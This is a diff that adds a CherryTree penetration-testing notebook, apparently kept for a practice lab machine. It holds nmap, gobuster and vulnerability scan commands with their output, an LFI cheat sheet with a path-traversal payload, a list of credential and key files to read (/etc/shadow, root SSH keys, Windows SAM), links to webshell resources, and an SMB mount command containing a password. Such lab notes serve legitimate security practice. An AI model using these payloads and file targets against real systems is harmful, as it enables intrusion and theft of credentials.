@@ -1,0 +1,1432 @@
+<?xml version="1.0" ?>
+<cherrytree>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Kioptrix" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587565077.42" ts_lastsave="1587565077.42" unique_id="38">
+		<rich_text></rich_text>
+		<node custom_icon_id="10" foreground="" is_bold="True" name="10.10.255.95" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1590145608.84" unique_id="39">
+			<rich_text></rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="Setup" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587568434.39" ts_lastsave="1587568440.66" unique_id="83">
+				<rich_text></rich_text>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="Alias" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587568479.92" ts_lastsave="1590145568.24" unique_id="84">
+					<rich_text>export target=10.10.255.95
+printenv
+*
+---
+gedit /etc/hosts
+add:
+192.168.16.129 target</rich_text>
+				</node>
+			</node>
+			<node custom_icon_id="21" foreground="" is_bold="False" name="Enumeration" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1492949452.72" unique_id="40">
+				<rich_text></rich_text>
+				<node custom_icon_id="18" foreground="" is_bold="False" name="TCP" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1492949819.41" ts_lastsave="1587583334.51" unique_id="41">
+					<rich_text></rich_text>
+					<node custom_icon_id="0" foreground="" is_bold="False" name="Ping Scan (Quick Sweep)" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587566370.19" ts_lastsave="1590145634.51" unique_id="80">
+						<rich_text background="#333333">nmap -sP </rich_text>
+						<rich_text>10.10.255.95
+---</rich_text>
+					</node>
+					<node custom_icon_id="0" foreground="" is_bold="False" name="Service &amp; OS Scan" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587565364.18" ts_lastsave="1590145859.59" unique_id="76">
+						<rich_text>nmap -A target
+(-O for just OS, -sV for just service)
+---
+Starting Nmap 7.80 ( </rich_text>
+						<rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
+						<rich_text> ) at 2020-05-22 07:08 EDT
+Nmap scan report for 10.10.255.95
+Host is up (0.21s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.3
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
+|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
+|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+3128/tcp open  http-proxy  Squid http proxy 3.5.12
+|_http-server-header: squid/3.5.12
+|_http-title: ERROR: The requested URL could not be retrieved
+3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Vuln University
+Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h20m01s, deviation: 2h18m34s, median: 0s
+|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: vulnuniversity
+|   NetBIOS computer name: VULNUNIVERSITY\x00
+|   Domain name: \x00
+|   FQDN: vulnuniversity
+|_  System time: 2020-05-22T07:09:07-04:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-05-22T11:09:07
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at </rich_text>
+						<rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
+						<rich_text> .
+Nmap done: 1 IP address (1 host up) scanned in 41.59 seconds
+</rich_text>
+					</node>
+					<node custom_icon_id="0" foreground="" is_bold="False" name="Full Scan" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587565540.94" ts_lastsave="1590148800.04" unique_id="79">
+						<rich_text>nmap -p- -sV -sS -T4 target
+---
+Starting Nmap 7.80 ( </rich_text>
+						<rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
+						<rich_text> ) at 2020-05-22 07:20 EDT
+Nmap scan report for 10.10.255.95
+Host is up (0.21s latency).
+Not shown: 65529 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.3
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+3128/tcp open  http-proxy  Squid http proxy 3.5.12
+3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at </rich_text>
+						<rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
+						<rich_text> .
+Nmap done: 1 IP address (1 host up) scanned in 498.13 seconds
+</rich_text>
+					</node>
+					<node custom_icon_id="0" foreground="" is_bold="False" name="Service Banners" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587565457.83" ts_lastsave="1590146267.98" unique_id="78">
+						<rich_text>nmap -sV 10.10.255.95
+---
+Starting Nmap 7.80 ( </rich_text>
+						<rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
+						<rich_text> ) at 2020-05-22 07:16 EDT
+Nmap scan report for 10.10.255.95
+Host is up (0.21s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.3
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+3128/tcp open  http-proxy  Squid http proxy 3.5.12
+3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at </rich_text>
+						<rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
+						<rich_text> .
+Nmap done: 1 IP address (1 host up) scanned in 35.79 seconds
+</rich_text>
+					</node>
+					<node custom_icon_id="0" foreground="" is_bold="False" name="Reconnoitre" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587583334.51" ts_lastsave="1587583348.93" unique_id="89">
+						<rich_text link="webs https://github.com/codingo/Reconnoitre" scale="h3">Reconnoitre</rich_text>
+						<rich_text>
+</rich_text>
+						<rich_text justification="left"></rich_text>
+						<codebox char_offset="12" frame_height="269" frame_width="475" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True"># Scan a single host, create file structure &amp; discover services
+python reconnoitre.py -t 192.168.1.5 -o /root/Documents/labs/ --services
+
+# Discover live hosts &amp; hostnames within a range
+python reconnoitre.py -t 192.168.1.1-252 -o /root/Documents/testing/ --pingsweep --hostnames
+    
+# Discover live hosts within a range and then do a quick probe for services
+python reconnoitre.py -t 192.168.1.1-252 -o /root/Documents/testing/ --pingsweep --services --quick    
+    
+# Discover live hosts w/in a range &amp; probe all ports (tcp &amp; udp) for services
+python reconnoitre.py -t 192.168.1.1-252 -o /root/Documents/testing/ --pingsweep --services</codebox>
+					</node>
+					<node custom_icon_id="0" foreground="" is_bold="False" name="Vuln Scan" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587565374.96" ts_lastsave="1587568556.39" unique_id="77">
+						<rich_text>nmap -Pn --script vuln,nmap-vulners,vulscan target
+---
+Starting Nmap 7.60 ( </rich_text>
+						<rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
+						<rich_text> ) at 2020-04-01 08:43 EDT
+Nmap scan report for 192.168.16.129
+Host is up (0.00029s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|   /test.php: Test page
+|   /icons/: Potentially interesting directory w/ listing on 'apache/1.3.20'
+|   /manual/: Potentially interesting directory w/ listing on 'apache/1.3.20'
+|_  /usage/: Potentially interesting folder
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-trace: TRACE is enabled
+111/tcp  open  rpcbind
+139/tcp  open  netbios-ssn
+443/tcp  open  https
+|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+| ssl-ccs-injection: 
+|   VULNERABLE:
+|   SSL/TLS MITM vulnerability (CCS Injection)
+|     State: VULNERABLE
+|     Risk factor: High
+|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
+|       does not properly restrict processing of ChangeCipherSpec messages,
+|       which allows man-in-the-middle attackers to trigger use of a zero
+|       length master key in certain OpenSSL-to-OpenSSL communications, and
+|       consequently hijack sessions or obtain sensitive information, via
+|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.
+|           
+|     References:
+|       </rich_text>
+						<rich_text link="webs http://www.cvedetails.com/cve/2014-0224">http://www.cvedetails.com/cve/2014-0224</rich_text>
+						<rich_text>
+|       </rich_text>
+						<rich_text link="webs https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</rich_text>
+						<rich_text>
+|_      </rich_text>
+						<rich_text link="webs http://www.openssl.org/news/secadv_20140605.txt">http://www.openssl.org/news/secadv_20140605.txt</rich_text>
+						<rich_text>
+| ssl-dh-params: 
+|   VULNERABLE:
+|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)
+|     State: VULNERABLE
+|     IDs:  OSVDB:122331  CVE:CVE-2015-4000
+|       The Transport Layer Security (TLS) protocol contains a flaw that is
+|       triggered when handling Diffie-Hellman key exchanges defined with
+|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker
+|       to downgrade the security of a TLS session to 512-bit export-grade
+|       cryptography, which is significantly weaker, allowing the attacker
+|       to more easily break the encryption and monitor or tamper with
+|       the encrypted stream.
+|     Disclosure date: 2015-5-19
+|     Check results:
+|       EXPORT-GRADE DH GROUP 1
+|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
+|             Modulus Type: Safe prime
+|             Modulus Source: mod_ssl 2.0.x/512-bit MODP group with safe prime modulus
+|             Modulus Length: 512
+|             Generator Length: 8
+|             Public Key Length: 512
+|     References:
+|       </rich_text>
+						<rich_text link="webs https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000</rich_text>
+						<rich_text>
+|       </rich_text>
+						<rich_text link="webs https://weakdh.org">https://weakdh.org</rich_text>
+						<rich_text>
+|       </rich_text>
+						<rich_text link="webs http://osvdb.org/122331">http://osvdb.org/122331</rich_text>
+						<rich_text>
+|   
+|   Diffie-Hellman Key Exchange Insufficient Group Strength
+|     State: VULNERABLE
+|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
+|       of insufficient strength, especially those using one of a few commonly
+|       shared groups, may be susceptible to passive eavesdropping attacks.
+|     Check results:
+|       WEAK DH GROUP 1
+|             Cipher Suite: TLS_DHE_RSA_WITH_DES_CBC_SHA
+|             Modulus Type: Safe prime
+|             Modulus Source: mod_ssl 2.0.x/1024-bit MODP group with safe prime modulus
+|             Modulus Length: 1024
+|             Generator Length: 8
+|             Public Key Length: 1024
+|     References:
+|_      </rich_text>
+						<rich_text link="webs https://weakdh.org">https://weakdh.org</rich_text>
+						<rich_text>
+| ssl-poodle: 
+|   VULNERABLE:
+|   SSL POODLE information leak
+|     State: VULNERABLE
+|     IDs:  OSVDB:113251  CVE:CVE-2014-3566
+|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
+|           products, uses nondeterministic CBC padding, which makes it easier
+|           for man-in-the-middle attackers to obtain cleartext data via a
+|           padding-oracle attack, aka the &quot;POODLE&quot; issue.
+|     Disclosure date: 2014-10-14
+|     Check results:
+|       TLS_RSA_WITH_3DES_EDE_CBC_SHA
+|     References:
+|       </rich_text>
+						<rich_text link="webs https://www.imperialviolet.org/2014/10/14/poodle.html">https://www.imperialviolet.org/2014/10/14/poodle.html</rich_text>
+						<rich_text>
+|       </rich_text>
+						<rich_text link="webs https://www.openssl.org/~bodo/ssl-poodle.pdf">https://www.openssl.org/~bodo/ssl-poodle.pdf</rich_text>
+						<rich_text>
+|       </rich_text>
+						<rich_text link="webs https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</rich_text>
+						<rich_text>
+|_      </rich_text>
+						<rich_text link="webs http://osvdb.org/113251">http://osvdb.org/113251</rich_text>
+						<rich_text>
+| sslv2-drown: 
+|   ciphers: 
+|     SSL2_DES_64_CBC_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_RC4_64_WITH_MD5
+|   vulns: 
+|     CVE-2016-0703: 
+|       title: OpenSSL: Divide-and-conquer session key recovery in SSLv2
+|       state: VULNERABLE
+|       ids: 
+|         CVE:CVE-2016-0703
+|       description: 
+|               The get_client_master_key function in s2_srvr.c in the SSLv2 implementation in
+|       OpenSSL before 0.9.8zf, 1.0.0 before 1.0.0r, 1.0.1 before 1.0.1m, and 1.0.2 before
+|       1.0.2a accepts a nonzero CLIENT-MASTER-KEY CLEAR-KEY-LENGTH value for an arbitrary
+|       cipher, which allows man-in-the-middle attackers to determine the MASTER-KEY value
+|       and decrypt TLS ciphertext data by leveraging a Bleichenbacher RSA padding oracle, a
+|       related issue to CVE-2016-0800.
+|     
+|       refs: 
+|         </rich_text>
+						<rich_text link="webs https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0703">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0703</rich_text>
+						<rich_text>
+|         </rich_text>
+						<rich_text link="webs https://www.openssl.org/news/secadv/20160301.txt">https://www.openssl.org/news/secadv/20160301.txt</rich_text>
+						<rich_text>
+|     CVE-2016-0800: 
+|       title: OpenSSL: Cross-protocol attack on TLS using SSLv2 (DROWN)
+|       state: VULNERABLE
+|       ids: 
+|         CVE:CVE-2016-0800
+|       description: 
+|               The SSLv2 protocol, as used in OpenSSL before 1.0.1s and 1.0.2 before 1.0.2g and
+|       other products, requires a server to send a ServerVerify message before establishing
+|       that a client possesses certain plaintext RSA data, which makes it easier for remote
+|       attackers to decrypt TLS ciphertext data by leveraging a Bleichenbacher RSA padding
+|       oracle, aka a &quot;DROWN&quot; attack.
+|     
+|       refs: 
+|         </rich_text>
+						<rich_text link="webs https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0800">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0800</rich_text>
+						<rich_text>
+|_        </rich_text>
+						<rich_text link="webs https://www.openssl.org/news/secadv/20160301.txt">https://www.openssl.org/news/secadv/20160301.txt</rich_text>
+						<rich_text>
+1024/tcp open  kdm
+MAC Address: 00:0C:29:70:63:17 (VMware)
+
+Host script results:
+|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]
+| smb-vuln-cve2009-3103: 
+|   VULNERABLE:
+|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2009-3103
+|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
+|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
+|           denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE
+|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
+|           aka &quot;SMBv2 Negotiation Vulnerability.&quot;
+|           
+|     Disclosure date: 2009-09-08
+|     References:
+|       </rich_text>
+						<rich_text link="webs http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103">http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103</rich_text>
+						<rich_text>
+|_      </rich_text>
+						<rich_text link="webs https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103</rich_text>
+						<rich_text>
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]
+</rich_text>
+					</node>
+				</node>
+				<node custom_icon_id="18" foreground="" is_bold="False" name="UDP" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1492949826.2" ts_lastsave="1587566901.16" unique_id="42">
+					<rich_text></rich_text>
+					<node custom_icon_id="0" foreground="" is_bold="False" name="UDP Scan" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587566901.16" ts_lastsave="1590155072.91" unique_id="81">
+						<rich_text>nmap -sU target
+---
+[sudo] password for user: 
+Starting Nmap 7.80 ( </rich_text>
+						<rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
+						<rich_text> ) at 2020-05-22 08:00 EDT
+Stats: 0:07:21 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
+UDP Scan Timing: About 46.55% done; ETC: 08:16 (0:08:28 remaining)
+Nmap scan report for 10.10.255.95
+Host is up (0.21s latency).
+Not shown: 997 closed ports
+PORT    STATE         SERVICE
+68/udp  open|filtered dhcpc
+137/udp open          netbios-ns
+138/udp open|filtered netbios-dgm
+
+Nmap done: 1 IP address (1 host up) scanned in 1000.95 seconds
+</rich_text>
+					</node>
+				</node>
+				<node custom_icon_id="17" foreground="" is_bold="False" name="Web Services" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1590146587.26" unique_id="43">
+					<rich_text></rich_text>
+					<node custom_icon_id="18" foreground="" is_bold="False" name="WhatWeb (profile)" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1500473692.93" ts_lastsave="1590146551.11" unique_id="46">
+						<rich_text>whatweb target
+---
+</rich_text>
+					</node>
+					<node custom_icon_id="18" foreground="" is_bold="False" name="Nikto" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1492949545.74" ts_lastsave="1590146547.8" unique_id="44">
+						<rich_text>nikto -h target -p 80,443
+---
+</rich_text>
+					</node>
+					<node custom_icon_id="18" foreground="" is_bold="False" name="Dirb\DirBuster" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1492949554.24" ts_lastsave="1590146539.54" unique_id="45">
+						<rich_text>dirb -r </rich_text>
+						<rich_text link="webs http://target">http://target</rich_text>
+						<rich_text> /usr/share/dirb/wordlists/big.txt
+---
+</rich_text>
+					</node>
+					<node custom_icon_id="0" foreground="" is_bold="False" name="gobuster" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1590146587.26" ts_lastsave="1590149358.21" unique_id="91">
+						<rich_text>gobuster dir -u </rich_text>
+						<rich_text link="webs http://&lt;ip&gt;:3333">http://target:3333</rich_text>
+						<rich_text> -w /usr/share/dirb/wordlists/big.txt
+gobuster dir -u </rich_text>
+						<rich_text link="webs http://10.10.255.95:3333">http://10.10.255.95:3333</rich_text>
+						<rich_text> -w dirbuster/directory-list-2.3-medium.txt
+/usr/share/wordlists has many lists
+---
+GoBuster flag	Description
+-e	Print the full URLs in your console
+-u	The target URL
+-w	Path to your wordlist
+-U and -P	Username and Password for Basic Auth
+-p &lt;x&gt;	Proxy to use for requests
+-c &lt;http cookies&gt;	Specify a cookie for simulating your auth
+---
+user@kalisi:/usr/share/wordlists$ gobuster dir -u </rich_text>
+						<rich_text link="webs http://10.10.255.95:3333">http://10.10.255.95:3333</rich_text>
+						<rich_text> -w dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            </rich_text>
+						<rich_text link="webs http://10.10.255.95:3333">http://10.10.255.95:3333</rich_text>
+						<rich_text>
+[+] Threads:        10
+[+] Wordlist:       dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/05/22 08:08:50 Starting gobuster
+===============================================================
+/images (Status: 301)
+/css (Status: 301)
+/js (Status: 301)
+/fonts (Status: 301)
+/internal (Status: 301)
+
+*internal has a file upload feature</rich_text>
+					</node>
+					<node custom_icon_id="0" foreground="" is_bold="False" name="LFI" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587583115.16" ts_lastsave="1587584029.69" unique_id="88">
+						<rich_text link="webs https://evi1us3r.wordpress.com/lfi-cheat-sheet/">https://evi1us3r.wordpress.com/lfi-cheat-sheet/</rich_text>
+						<rich_text>
+</rich_text>
+						<rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal</rich_text>
+						<rich_text>
+</rich_text>
+						<rich_text link="webs https://highon.coffee/blog/lfi-cheat-sheet/">https://highon.coffee/blog/lfi-cheat-sheet/</rich_text>
+						<rich_text>
+</rich_text>
+						<rich_text link="webs https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf">https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</rich_text>
+						<rich_text>
+
+LFI Cheat Sheet  
+</rich_text>
+						<rich_text weight="heavy">Useful LFI files</rich_text>
+						<rich_text>
+../../../../../etc/passwd%00
+ 
+</rich_text>
+						<rich_text weight="heavy">Linux:</rich_text>
+						<rich_text>
+/etc/passwd
+/etc/shadow
+/etc/issue
+/etc/group
+/etc/hostname
+/etc/ssh/ssh_config
+/etc/ssh/sshd_config
+/root/.ssh/id_rsa
+/root/.ssh/authorized_keys
+/home/user/.ssh/authorized_keys
+/home/user/.ssh/id_rsa
+ 
+</rich_text>
+						<rich_text weight="heavy">Apache:</rich_text>
+						<rich_text>
+Configuration Files:
+/etc/apache2/apache2.conf
+/usr/local/etc/apache2/httpd.conf
+/etc/httpd/conf/httpd.conf
+ 
+</rich_text>
+						<rich_text weight="heavy">Log</rich_text>
+						<rich_text> </rich_text>
+						<rich_text weight="heavy">Files</rich_text>
+						<rich_text>:
+Red Hat/CentOS/Fedora Linux-   /var/log/httpd/access_log
+Debian/Ubuntu-   /var/log/apache2/access.log
+FreeBSD-   /var/log/httpd-access.log
+ 
+</rich_text>
+						<rich_text weight="heavy">Generic</rich_text>
+						<rich_text>:
+/var/log/apache/access.log
+/var/log/apache/error.log
+/var/log/apache2/access.log
+/var/log/apache/error.log
+ 
+</rich_text>
+						<rich_text weight="heavy">MySql:</rich_text>
+						<rich_text>
+/var/lib/mysql/mysql/user.frm
+/var/lib/mysql/mysql/user.MYD
+/var/lib/mysql/mysql/user.MYI
+ 
+</rich_text>
+						<rich_text weight="heavy">Windows:</rich_text>
+						<rich_text>
+/boot.ini
+/autoexec.bat
+/windows/system32/drivers/etc/hosts
+/windows/repair/SAM
+/windows/panther/unattended.xml
+/windows/panther/unattend/unattended.xml
+
+  Local File Inclusion/Remote File Inclusion (LFI/RFI) 
+•  </rich_text>
+						<rich_text link="webs http://www.grobinson.me/single-line-php-script-to-gain-shell/">http://www.grobinson.me/single-line-php-script-to-gain-shell/</rich_text>
+						<rich_text>
+• </rich_text>
+						<rich_text link="webs https://webshell.co/">https://webshell.co/</rich_text>
+						<rich_text>
+• </rich_text>
+						<rich_text link="webs https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf">https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</rich_text>
+						<rich_text>
+• </rich_text>
+						<rich_text link="webs https://osandamalith.com/2015/03/29/lfi-freak/">https://osandamalith.com/2015/03/29/lfi-freak/</rich_text>
+						<rich_text>
+• </rich_text>
+						<rich_text link="webs https://wiki.apache.org/httpd/DistrosDefaultLayout#Debian.2C_Ubuntu_.28Apache_httpd_2.x.29">https://wiki.apache.org/httpd/DistrosDefaultLayout#Debian.2C_Ubuntu_.28Apache_httpd_2.x.29</rich_text>
+						<rich_text>
+• </rich_text>
+						<rich_text link="webs https://roguecod3r.wordpress.com/2014/03/17/lfi-to-shell-exploiting-apache-access-log/">https://roguecod3r.wordpress.com/2014/03/17/lfi-to-shell-exploiting-apache-access-log/</rich_text>
+						<rich_text>
+• </rich_text>
+						<rich_text link="webs https://attackerkb.com/Windows/blind_files">https://attackerkb.com/Windows/blind_files</rich_text>
+						<rich_text>
+• </rich_text>
+						<rich_text link="webs https://digi.ninja/blog/when_all_you_can_do_is_read.php">https://digi.ninja/blog/when_all_you_can_do_is_read.php</rich_text>
+						<rich_text>
+• </rich_text>
+						<rich_text link="webs https://updatedlinux.wordpress.com/2011/05/12/list-of-important-files-and-directories-in-linux-redhatcentosfedora/">https://updatedlinux.wordpress.com/2011/05/12/list-of-important-files-and-directories-in-linux-redhatcentosfedora/</rich_text>
+						<rich_text>
+• </rich_text>
+						<rich_text link="webs https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/">https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/</rich_text>
+						<rich_text>
+• </rich_text>
+						<rich_text link="webs https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/LFI_InterestingFiles-NullByteAdded.txt">https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/LFI_InterestingFiles-NullByteAdded.txt</rich_text>
+						<rich_text> 
+• </rich_text>
+						<rich_text link="webs http://www.r00tsec.com/2014/04/useful-list-file-for-local-file.html">http://www.r00tsec.com/2014/04/useful-list-file-for-local-file.html</rich_text>
+						<rich_text> 
+• </rich_text>
+						<rich_text link="webs https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/">https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/</rich_text>
+						<rich_text> 
+• </rich_text>
+						<rich_text link="webs https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/LFI-FD-check.txt">https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/LFI-FD-check.txt</rich_text>
+						<rich_text> </rich_text>
+					</node>
+					<node custom_icon_id="0" foreground="" is_bold="False" name="Aqutone (for reporting)" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587584029.69" ts_lastsave="1587584050.27" unique_id="90">
+						<rich_text></rich_text>
+					</node>
+				</node>
+				<node custom_icon_id="44" foreground="" is_bold="False" name="Other Services" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1587570784.47" unique_id="48">
+					<rich_text></rich_text>
+					<node custom_icon_id="0" foreground="" is_bold="False" name="SMB" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1500473455.56" ts_lastsave="1587582935.21" unique_id="49">
+						<rich_text link="webs https://highon.coffee/blog/enum4linux-cheat-sheet/">https://highon.coffee/blog/enum4linux-cheat-sheet/</rich_text>
+						<rich_text>
+
+mount -t cifs &quot;//10.11.1.49/admin$&quot; /mnt/windows/ -o username=bethany\alice,domain=workgroup,password=loading1 --verbose
+
+</rich_text>
+						<rich_text scale="h2">SMB Enum</rich_text>
+						<rich_text>
+</rich_text>
+						<rich_text justification="left"></rich_text>
+						<rich_text>
+
+</rich_text>
+						<rich_text scale="h2">Fingerprint SMB version</rich_text>
+						<rich_text>
+</rich_text>
+						<rich_text justification="left"></rich_text>
+						<rich_text>
+
+</rich_text>
+						<rich_text scale="h2">Find open SMB Shares</rich_text>
+						<rich_text>
+</rich_text>
+						<rich_text justification="left"></rich_text>
+						<rich_text>
+
+</rich_text>
+						<rich_text scale="h2">Enumerate SMB Users</rich_text>
+						<rich_text>
+</rich_text>
+						<rich_text justification="left"></rich_text>
+						<rich_text>
+
+</rich_text>
+						<rich_text scale="h2">SMB Server</rich_text>
+						<rich_text>
+</rich_text>
+						<rich_text justification="left"></rich_text>
+						<rich_text>
+
+</rich_text>
